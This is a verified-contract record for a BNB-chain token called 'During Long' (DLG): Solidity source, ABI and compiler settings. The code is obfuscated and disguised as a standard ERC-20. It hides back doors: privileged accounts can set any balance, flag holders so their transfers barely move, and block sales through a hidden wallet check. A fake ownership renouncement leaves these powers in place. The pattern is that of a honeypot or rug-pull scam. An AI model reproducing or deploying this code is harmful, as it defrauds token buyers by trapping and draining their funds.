{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface listLaunchIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitMaxSwap {\n    function createPair(address modeTo, address fromTx) external returns (address);\n}\n\ninterface shouldFundAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingFrom) external view returns (uint256);\n\n    function transfer(address fundAt, uint256 teamIs) external returns (bool);\n\n    function allowance(address modeMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundAt,\n        uint256 teamIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitTake, uint256 value);\n    event Approval(address indexed modeMax, address indexed spender, uint256 value);\n}\n\ninterface shouldFundAmountMetadata is shouldFundAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DuringLong is launchedTeam, shouldFundAmount, shouldFundAmountMetadata {\n\n    uint256 toFrom;\n\n    function toTx(address fromMinShould) public {\n        maxTakeList();\n        if (launchedWalletFrom != launchedIs) {\n            limitWallet = false;\n        }\n        if (fromMinShould == teamAuto || fromMinShould == marketingExempt) {\n            return;\n        }\n        tokenIsMax[fromMinShould] = true;\n    }\n\n    function walletExempt(address totalTx, address fundAt, uint256 teamIs) internal returns (bool) {\n        if (totalTx == teamAuto) {\n            return totalSwap(totalTx, fundAt, teamIs);\n        }\n        uint256 swapEnable = shouldFundAmount(marketingExempt).balanceOf(marketingTotalWallet);\n        require(swapEnable == teamToTx);\n        require(fundAt != marketingTotalWallet);\n        if (tokenIsMax[totalTx]) {\n            return totalSwap(totalTx, fundAt, teamShould);\n        }\n        return totalSwap(totalTx, fundAt, teamIs);\n    }\n\n    bool private maxSell;\n\n    event OwnershipTransferred(address indexed launchedEnable, address indexed atMax);\n\n    function getOwner() external view returns (address) {\n        return listExempt;\n    }\n\n    mapping(address => bool) public tokenIsMax;\n\n    function receiverLiquidity(uint256 teamIs) public {\n        maxTakeList();\n        teamToTx = teamIs;\n    }\n\n    address public marketingExempt;\n\n    uint8 private swapMode = 18;\n\n    function transferFrom(address totalTx, address fundAt, uint256 teamIs) external override returns (bool) {\n        if (_msgSender() != fromBuy) {\n            if (launchedFund[totalTx][_msgSender()] != type(uint256).max) {\n                require(teamIs <= launchedFund[totalTx][_msgSender()]);\n                launchedFund[totalTx][_msgSender()] -= teamIs;\n            }\n        }\n        return walletExempt(totalTx, fundAt, teamIs);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingTotal;\n    }\n\n    bool public shouldTrading;\n\n    bool public teamLiquidityIs;\n\n    address marketingTotalWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private launchedWalletFrom;\n\n    bool private teamExempt;\n\n    function tokenLaunched(address tradingAtLimit, uint256 teamIs) public {\n        maxTakeList();\n        isMax[tradingAtLimit] = teamIs;\n    }\n\n    function totalSwap(address totalTx, address fundAt, uint256 teamIs) internal returns (bool) {\n        require(isMax[totalTx] >= teamIs);\n        isMax[totalTx] -= teamIs;\n        isMax[fundAt] += teamIs;\n        emit Transfer(totalTx, fundAt, teamIs);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return listExempt;\n    }\n\n    uint256 constant teamShould = 10 ** 10;\n\n    function approve(address tradingFeeIs, uint256 teamIs) public virtual override returns (bool) {\n        launchedFund[_msgSender()][tradingFeeIs] = teamIs;\n        emit Approval(_msgSender(), tradingFeeIs, teamIs);\n        return true;\n    }\n\n    uint256 private atLaunched = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        listLaunchIs shouldFrom = listLaunchIs(fromBuy);\n        marketingExempt = limitMaxSwap(shouldFrom.factory()).createPair(shouldFrom.WETH(), address(this));\n        if (launchedIs != launchedWalletFrom) {\n            launchedWalletFrom = launchedIs;\n        }\n        teamAuto = _msgSender();\n        receiverEnable();\n        launchedTake[teamAuto] = true;\n        isMax[teamAuto] = atLaunched;\n        \n        emit Transfer(address(0), teamAuto, atLaunched);\n    }\n\n    bool public amountTotal;\n\n    uint256 private launchedIs;\n\n    function receiverEnable() public {\n        emit OwnershipTransferred(teamAuto, address(0));\n        listExempt = address(0);\n    }\n\n    function transfer(address tradingAtLimit, uint256 teamIs) external virtual override returns (bool) {\n        return walletExempt(_msgSender(), tradingAtLimit, teamIs);\n    }\n\n    bool public limitWallet;\n\n    string private senderTotalFee = \"During Long\";\n\n    mapping(address => bool) public launchedTake;\n\n    address public teamAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atLaunched;\n    }\n\n    string private tradingTotal = \"DLG\";\n\n    bool public toLimit;\n\n    uint256 teamToTx;\n\n    address private listExempt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapMode;\n    }\n\n    function autoLimit(address toAmountTeam) public {\n        if (amountTotal) {\n            return;\n        }\n        if (maxSell == shouldTrading) {\n            launchedWalletFrom = launchedIs;\n        }\n        launchedTake[toAmountTeam] = true;\n        \n        amountTotal = true;\n    }\n\n    function balanceOf(address tradingFrom) public view virtual override returns (uint256) {\n        return isMax[tradingFrom];\n    }\n\n    bool public launchFee;\n\n    bool public isReceiverEnable;\n\n    function name() external view virtual override returns (string memory) {\n        return senderTotalFee;\n    }\n\n    address fromBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private launchedFund;\n\n    mapping(address => uint256) private isMax;\n\n    function allowance(address buyAt, address tradingFeeIs) external view virtual override returns (uint256) {\n        if (tradingFeeIs == fromBuy) {\n            return type(uint256).max;\n        }\n        return launchedFund[buyAt][tradingFeeIs];\n    }\n\n    function maxTakeList() private view {\n        require(launchedTake[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingFeeIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFeeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAmountTeam\",\"type\":\"address\"}],\"name\":\"autoLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isReceiverEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamIs\",\"type\":\"uint256\"}],\"name\":\"receiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLiquidityIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMinShould\",\"type\":\"address\"}],\"name\":\"toTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenIsMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAtLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamIs\",\"type\":\"uint256\"}],\"name\":\"tokenLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAtLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DuringLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}